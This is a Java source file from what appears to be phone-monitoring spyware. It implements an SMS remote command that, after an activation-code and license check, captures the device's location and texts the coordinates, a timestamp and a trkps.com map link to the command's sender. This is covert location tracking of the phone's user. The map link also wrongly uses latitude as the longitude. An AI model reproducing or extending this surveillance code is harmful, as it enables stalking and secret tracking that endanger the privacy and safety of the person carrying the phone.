package com.vvt.remotecommandmanager.processor.location;

import java.text.SimpleDateFormat;
import java.util.List;
import java.util.concurrent.CountDownLatch;

import com.vvt.appcontext.AppContext;
import com.vvt.base.FxEvent;
import com.vvt.capture.location.LocationCaptureManager;
import com.vvt.capture.location.LocationOnDemandListener;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.events.FxLocationEvent;
import com.vvt.events.FxLocationMethod;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class OnDemandLocationProcessor  extends RemoteCommandProcessor {
	private static final String TAG = "OnDemandLocationProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private LicenseInfo mLicenseInfo;
	private CountDownLatch mWaitForResponseLatch;
	private LocationCaptureManager mLocationCaptureManager;
	private StringBuilder mReplyMessageBuilder;
	
	public OnDemandLocationProcessor(AppContext appContext,
			FxEventRepository eventRepository, LicenseInfo licenseInfo,
			LocationCaptureManager locationCaptureManager) {
		super(appContext, eventRepository);
		
		mLicenseInfo = licenseInfo;
		mReplyMessage = new ProcessingResult();
		mLocationCaptureManager = locationCaptureManager;
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.ASYNC_NON_HTTP;
	}


	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand() ENTER ..");
		mWaitForResponseLatch = new CountDownLatch(1);
		
		mReplyMessageBuilder = new StringBuilder();
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED || mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_OR_EXPIRED);
			mReplyMessage.setIsSuccess(true);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
			return;
		}	
		 
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		mLocationCaptureManager.getLocationOnDemand(mOnDemandListener);

		// Block the thread and wait till onSuccess or onError called.
		try {
			mWaitForResponseLatch.await();
		} catch (InterruptedException e) {
			if(LOGE) FxLog.e(TAG, e.getMessage());
		}
		if(LOGV) FxLog.v(TAG, "doProcessCommand() EXIT ..");
	}
	
	LocationOnDemandListener mOnDemandListener = new LocationOnDemandListener() {
		
		@Override
		public void locationOnDemandUpdated(List<FxEvent> events) {
			FxLog.v(TAG, "locationOnDemandUpdated() ENTER ..");

			
			if(events != null && events.size() > 0) {
				FxLocationEvent locationEvent = (FxLocationEvent)events.get(0);
				
				if(!locationEvent.isMockLocaion()) {
					String message = "";
					String date = "";
					String coordinates = "";
					String mapUrl = "";
					
					if(locationEvent.getMethod() == FxLocationMethod.NETWORK) {
						message = "Coordinates received from network:";
					} else if (locationEvent.getMethod() == FxLocationMethod.INTERGRATED_GPS){
						message = "Coordinates received from satellite positioning:";
					} else {
						message = "Coordinates based on cell information:";
					}
					
					SimpleDateFormat sdfDate = new SimpleDateFormat("dd-MM-yyyy HH:mm");//dd/MM/yyyy
					date = "Date: "+sdfDate.format(locationEvent.getEventTime());
					coordinates = String.format("Coordinates: %s, %s", locationEvent.getLatitude(), locationEvent.getLongitude());
					mapUrl = "http://trkps.com/m.php?lat="+locationEvent.getLatitude()+"&long="+locationEvent.getLatitude()+"&a=%S&i=3520220005602477&z=5";
				
					mReplyMessage.setIsSuccess(true);
					mReplyMessageBuilder.append(String.format("%s\n%s\n%s\n%s", message,date,coordinates,mapUrl));
					mReplyMessage.setMessage(mReplyMessageBuilder.toString());
				
				} else {
					mReplyMessage.setIsSuccess(false);
					mReplyMessageBuilder.append(MessageManager.ON_DEMAND_LOCATION_ERROR);
					mReplyMessage.setMessage(mReplyMessageBuilder.toString());
				}
			} else {
				mReplyMessage.setIsSuccess(false);
				mReplyMessageBuilder.append(MessageManager.ON_DEMAND_LOCATION_ERROR);
				mReplyMessage.setMessage(mReplyMessageBuilder.toString());
			}
			if(LOGD) FxLog.d(TAG, "locationOnDemandUpdated # IsSuccess : " + mReplyMessage.isSuccess());
			if(LOGD) FxLog.d(TAG, "locationOnDemandUpdated # ReplyMessage : " + mReplyMessage.getMessage());
			if(LOGV) FxLog.v(TAG, "locationOnDemandUpdated # EXIT ...");
			mWaitForResponseLatch.countDown();	
		}
		
		@Override
		public void locationOndemandError(Throwable ex) {
			if(LOGV) FxLog.v(TAG, "LocationOndemandError # ENTER ...");
			mReplyMessage.setIsSuccess(false);
			mReplyMessage.setMessage(MessageManager.ON_DEMAND_LOCATION_ERROR);
			
			if(LOGD) FxLog.d(TAG, "LocationOndemandError # IsSuccess : " + mReplyMessage.isSuccess());
			if(LOGD) FxLog.d(TAG, "LocationOndemandError # ReplyMessage : " + mReplyMessage.getMessage());
			if(LOGV) FxLog.v(TAG, "LocationOndemandError # EXIT ...");
			mWaitForResponseLatch.countDown();	
		}
	};
	
	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException {
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			//Command should only have 1 arguments.
			if(commandData.getArguments().size() != 1) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}
	}

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}

}
